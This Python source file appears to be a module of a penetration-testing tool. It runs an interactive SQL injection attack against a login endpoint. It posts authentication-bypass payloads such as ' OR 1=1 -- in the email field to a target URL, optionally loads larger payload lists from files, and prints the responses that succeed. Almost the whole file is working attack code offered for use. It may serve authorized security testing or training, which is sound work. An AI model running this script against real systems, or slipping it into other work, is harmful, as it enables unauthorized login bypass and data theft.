from dotenv import load_dotenv
import os
import json
from tqdm import tqdm
from rich import print
import requests
from cyber_stad_tool_v1.components import banner

load_dotenv()

base_url = os.environ.get("BASE_URL")


def press_enter_to_continue():
    input(f"Press Enter to continue...")
    pass


def attack_sql_injection(url):
    response_result = {}
    payloads = {
        "default": ["' OR 1=1 --", "' OR '1'='1' --", "admin' or '1'='1'--", "' OR 1=1;"],
        "medium": [],  # read data from file
        "high": []
    }

    # new_url = url + '/rest/user/login'
    new_url = url
    selected_payload = []

    print("Select the level of payloads:")
    print("[bold magenta]1. Default[/bold magenta]")
    print("[bold magenta]2. Medium[/bold magenta]")
    print("[bold magenta]3. High[/bold magenta]")
    level = int(input("Please choose your payload option from 1 to 3: "))

    if level == 1:
        selected_payload = payloads["default"]
    elif level == 2:
        try:
            with open("payloads/medium_payload", "r") as medium_payload:
                for line in medium_payload:
                    payloads["medium"].append(line.strip())  # strip newline characters
        except FileNotFoundError:
            print("[bold red]File not found![/bold red]")
        selected_payload = payloads["medium"]
    elif level == 3:
        try:
            with open("payloads/high_payload", "r") as high_payload:
                for line in high_payload:
                    payloads["high"].append(line.strip())  # strip newline characters
        except FileNotFoundError:
            print("[bold red]File not found![/bold red]")
        selected_payload = payloads["high"]
    else:
        print("[bold red]Invalid level of payload![/bold red]")

    with tqdm(total=len(selected_payload), desc="Testing Payloads", unit="payload") as pbar:
        for payload in selected_payload:
            params = {'email': payload, 'password': 'password123'}
            try:
                response = requests.post(new_url, json=params)
            except requests.exceptions.RequestException as e:
                print(e.response)
            else:
                if response.status_code == 200:
                    response_result[payload] = response.json()
            pbar.update(1)
    print()
    summary_result(new_url, level, selected_payload, response_result)
    print()


def summary_result(new_url, level, selected_payload, response_result):
    print("[bold cyan]---------| Finished the scanning attack |---------[/bold cyan]")
    print("[bold blue]---------| SUMMARY |---------[/bold blue]")
    print(f"[bold yellow]Target URL:[/bold yellow] {new_url}")
    if "level" in locals():
        if level == 1:
            print(f"[bold yellow]Payload level:[/bold yellow] Default")
        elif level == 2:
            print(f"[bold yellow]Payload level:[/bold yellow] Medium")
        elif level == 3:
            print(f"[bold yellow]Payload level:[/bold yellow] High")
        else:
            print("[bold yellow]Payload level:[/bold yellow] Invalid")
    print(f"[bold yellow]Total number of payloads:[/bold yellow] {len(selected_payload)}")
    print(f"[bold yellow]Total number of payloads successful:[/bold yellow] {len(response_result)}")
    print(
        f"[bold yellow]Total number of payloads failed:[/bold yellow] {len(selected_payload) - len(response_result)}")
    print(f"[bold yellow]Payload with result : [/bold yellow] ")
    print(json.dumps(response_result, indent=4))
    press_enter_to_continue()


def call_sql_injection():
    # use with while loop to allow user to run the tool again
    while True:
        print("[bold blue]-----------| SQL Injection  |-----------[/bold blue]")
        banner.sql_banner()
        print("[bold green]1. Attack[/bold green]")
        print("[bold green]2. Exit[/bold green]")

        choice = int(input("Please choose an option (1 or 2): "))

        if choice == 1:
            print(f"[bold yellow]example: {base_url}/login[/bold yellow]")
            taget_url = input(f"Enter the target url:")
            attack_sql_injection(taget_url)
        elif choice == 2:
            print("[bold blue]-----------| END OF SQL Injection  |-----------[/bold blue]")
            break
        else:
            print("[bold red]Invalid choice. Please select 1 or 2.[/bold red]")


call_sql_injection()
